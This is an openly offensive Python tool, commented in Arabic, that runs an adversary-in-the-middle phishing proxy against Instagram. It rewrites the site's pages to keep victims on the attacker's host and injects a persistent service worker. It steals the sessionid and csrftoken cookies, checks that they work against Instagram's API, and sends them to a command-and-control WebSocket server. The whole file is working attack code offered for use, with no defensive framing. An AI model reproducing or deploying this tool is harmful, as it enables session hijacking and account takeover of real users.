#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Z3R0 GHOST PROXY v3.0 — أداة نظامية لاختراق جلسات Instagram عبر MITM
تعمل على Kali Linux و Termux
"""

import argparse
import asyncio
import json
import os
import random
import re
import ssl
import sys
import time
from urllib.parse import urljoin

from aiohttp import web, ClientSession, WSMsgType, TCPConnector
from aiohttp.resolver import AsyncResolver

# ------------------------------------------------------------
# الإعدادات الافتراضية
# ------------------------------------------------------------
DEFAULT_TARGET = "www.instagram.com"
DEFAULT_PORT = 8080
CONFIG_FILE = "config.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]

class GhostProxy:
    def __init__(self, target_host, c2_ws_url, proxy_host=None):
        self.target_host = target_host
        self.target_url = f"https://{target_host}"
        self.c2_ws_url = c2_ws_url
        self.proxy_host = proxy_host
        self.stolen_queue = asyncio.Queue()
        self.http_session = None

    def get_session(self):
        if self.http_session is None or self.http_session.closed:
            connector = TCPConnector(
                resolver=AsyncResolver(nameservers=['1.1.1.1', '8.8.8.8']),
                force_close=False,
                enable_cleanup_closed=True,
                limit=100
            )
            self.http_session = ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=15))
        return self.http_session

    # --- Service Worker ---
    @property
    def sw_script(self):
        return f"""
// Z3R0 SW
self.addEventListener('install', e => {{ e.waitUntil(self.skipWaiting()); }});
self.addEventListener('activate', e => {{ e.waitUntil(self.clients.claim()); }});
self.addEventListener('fetch', e => {{
  const url = new URL(e.request.url);
  if (url.hostname === '{self.target_host}') {{
    const proxyUrl = 'https://' + self.location.host + url.pathname + url.search;
    e.respondWith(fetch(proxyUrl, {{ method: e.request.method, headers: e.request.headers, body: e.request.body }}));
  }}
}});
"""

    def inject_sw(self, html: bytes) -> bytes:
        if b'</head>' in html:
            script = f"<script>if('serviceWorker' in navigator){{navigator.serviceWorker.register('/sw.js',{{scope:'/'}});}}</script>".encode()
            html = html.replace(b'</head>', script + b'</head>', 1)
        return html

    # --- استخراج الجلسات ---
    def extract_cookies(self, response_headers):
        set_cookies = response_headers.getall('Set-Cookie') if hasattr(response_headers, 'getall') else []
        sid = csrf = None
        for c in set_cookies:
            if 'sessionid=' in c:
                sid = re.search(r'sessionid=([^;]+)', c).group(1)
            if 'csrftoken=' in c:
                csrf = re.search(r'csrftoken=([^;]+)', c).group(1)
        return sid, csrf

    async def validate_session(self, sid, csrf):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Cookie": f"sessionid={sid}; csrftoken={csrf}",
            "X-CSRFToken": csrf,
        }
        try:
            async with self.get_session().get(
                "https://i.instagram.com/api/v1/accounts/current_user/?edit=true",
                headers=headers, timeout=10
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    user = data.get("user", {})
                    return {"valid": True, "username": user.get("username"), "pk": user.get("pk")}
        except:
            pass
        return {"valid": False}

    async def exfil_worker(self):
        while True:
            payload = await self.stolen_queue.get()
            try:
                async with self.get_session().ws_connect(self.c2_ws_url) as ws:
                    await ws.send_json(payload)
            except Exception as e:
                print(f"[!] Exfil failed: {e}")
            finally:
                self.stolen_queue.task_done()

    async def handle_stolen(self, sid, csrf, ip):
        info = await self.validate_session(sid, csrf)
        payload = {
            "ts": time.time(),
            "sessionid": sid,
            "csrftoken": csrf,
            "ip": ip,
            "valid": info.get("valid"),
            "username": info.get("username"),
        }
        print(f"[🚨] STOLEN: {json.dumps(payload)}")
        await self.stolen_queue.put(payload)

    # --- إعادة كتابة المحتوى ---
    def rewrite_text(self, text: str, proxy_host: str) -> str:
        text = text.replace(f'https://{self.target_host}', f'https://{proxy_host}')
        text = text.replace(f'http://{self.target_host}', f'https://{proxy_host}')
        text = text.replace(f'//{self.target_host}', f'//{proxy_host}')
        return text

    def mangle(self, body: bytes, content_type: str, proxy_host: str) -> bytes:
        if not body:
            return body
        ct = content_type.lower()
        if 'text/html' in ct:
            html = body.decode('utf-8', errors='ignore')
            html = self.rewrite_text(html, proxy_host)
            html = self.inject_sw(html.encode()).decode('utf-8', errors='ignore')
            return html.encode('utf-8')
        elif any(t in ct for t in ('javascript', 'css', 'json')):
            text = body.decode('utf-8', errors='ignore')
            text = self.rewrite_text(text, proxy_host)
            return text.encode('utf-8')
        return body

    # --- معالجات HTTP ---
    async def sw_handler(self, request):
        return web.Response(body=self.sw_script.encode(), content_type="application/javascript",
                            headers={"Service-Worker-Allowed": "/"})

    async def proxy_handler(self, request):
        if self.proxy_host is None:
            self.proxy_host = request.host
        path = request.match_info.get('path', '')
        target = urljoin(self.target_url, path)
        if request.query_string:
            target += '?' + request.query_string

        headers = {k: v for k, v in request.headers.items()
                   if k.lower() not in ('host', 'content-length', 'connection', 'accept-encoding')}
        headers['Host'] = self.target_host
        headers['X-Forwarded-For'] = request.remote
        headers['User-Agent'] = random.choice(USER_AGENTS)
        if 'Referer' in headers and self.proxy_host in headers['Referer']:
            headers['Referer'] = headers['Referer'].replace(self.proxy_host, self.target_host)

        try:
            async with self.get_session().request(
                method=request.method, url=target, headers=headers,
                data=await request.read() if request.method in ('POST', 'PUT', 'PATCH') else None,
                allow_redirects=False, timeout=15
            ) as resp:
                sid, csrf = self.extract_cookies(resp.headers)
                if sid:
                    asyncio.ensure_future(self.handle_stolen(sid, csrf, request.remote))

                body = await resp.read()
                body = self.mangle(body, resp.headers.get('Content-Type', ''), self.proxy_host)

                resp_headers = {}
                for name, val in resp.headers.items():
                    lname = name.lower()
                    if lname in ('content-encoding', 'transfer-encoding', 'connection', 'keep-alive'):
                        continue
                    if lname == 'location':
                        loc = val
                        if loc.startswith('/'):
                            loc = f"https://{self.proxy_host}{loc}"
                        elif self.target_host in loc:
                            loc = loc.replace(self.target_host, self.proxy_host).replace('http://', 'https://')
                        resp_headers[name] = loc
                    else:
                        resp_headers[name] = val

                set_cookies = resp.headers.getall('Set-Cookie')
                if set_cookies:
                    resp_headers['Set-Cookie'] = ', '.join(set_cookies)

                if resp.status in (301, 302, 303, 307, 308):
                    raise web.HTTPFound(location=resp_headers.get('Location', '/'), headers=resp_headers)

                return web.Response(status=resp.status, body=body, headers=resp_headers)
        except Exception as e:
            print(f"[!] Proxy error: {e}")
            return web.Response(text="Proxy Error", status=502)

    async def ws_handler(self, request):
        path = request.match_info.get('path', '')
        target_ws = f"wss://{self.target_host}/{path}"
        if request.query_string:
            target_ws += '?' + request.query_string

        ws_client = web.WebSocketResponse()
        await ws_client.prepare(request)

        try:
            async with self.get_session().ws_connect(target_ws, headers={"User-Agent": random.choice(USER_AGENTS)}) as ws_up:
                async def fwd_up():
                    async for msg in ws_client:
                        if msg.type == WSMsgType.TEXT:
                            await ws_up.send_str(msg.data)
                        elif msg.type == WSMsgType.BINARY:
                            await ws_up.send_bytes(msg.data)
                        elif msg.type == WSMsgType.CLOSE:
                            break
                async def fwd_down():
                    async for msg in ws_up:
                        if msg.type == WSMsgType.TEXT:
                            await ws_client.send_str(msg.data)
                        elif msg.type == WSMsgType.BINARY:
                            await ws_client.send_bytes(msg.data)
                        elif msg.type == WSMsgType.CLOSE:
                            break
                await asyncio.gather(fwd_up(), fwd_down())
        except:
            pass
        return ws_client

    def build_app(self):
        app = web.Application()
        app.router.add_route('GET', '/sw.js', self.sw_handler)
        app.router.add_route('*', '/ws/{path:.*}', self.ws_handler)
        app.router.add_route('*', '/{path:.*}', self.proxy_handler)
        app.on_startup.append(lambda _: asyncio.create_task(self.exfil_worker()))
        app.on_shutdown.append(lambda _: self.get_session().close() if self.http_session else None)
        return app

def main():
    parser = argparse.ArgumentParser(description="Z3R0 Ghost Proxy - Instagram MITM")
    parser.add_argument("--host", default="0.0.0.0", help="IP الاستماع")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="المنفذ")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="النطاق الهدف")
    parser.add_argument("--c2-ws", default="wss://c2.your-hidden-server.com/exfil", help="WebSocket C2")
    parser.add_argument("--ssl-cert", help="شهادة SSL (لـ HTTPS)")
    parser.add_argument("--ssl-key", help="مفتاح الشهادة")
    parser.add_argument("--config", help="ملف إعدادات JSON")
    args = parser.parse_args()

    # دمج الإعدادات من ملف config إن وجد
    c2_ws = args.c2_ws
    target = args.target
    if args.config and os.path.exists(args.config):
        with open(args.config) as f:
            cfg = json.load(f)
        c2_ws = cfg.get("c2_ws_url", c2_ws)
        target = cfg.get("target_host", target)

    proxy = GhostProxy(target, c2_ws)
    app = proxy.build_app()

    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║   Z3R0 GHOST PROXY v3.0 — MITM Instagram           ║
    ║   Target: {target:<40} ║
    ║   C2 WS : {c2_ws:<40} ║
    ╚══════════════════════════════════════════════════════╝
    """)

    if args.ssl_cert and args.ssl_key:
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(args.ssl_cert, args.ssl_key)
        web.run_app(app, host=args.host, port=args.port, ssl_context=ssl_context)
    else:
        print("[!] تشغيل بدون SSL - استخدم شهادة للإنتاج")
        web.run_app(app, host=args.host, port=args.port)

if __name__ == "__main__":
    main()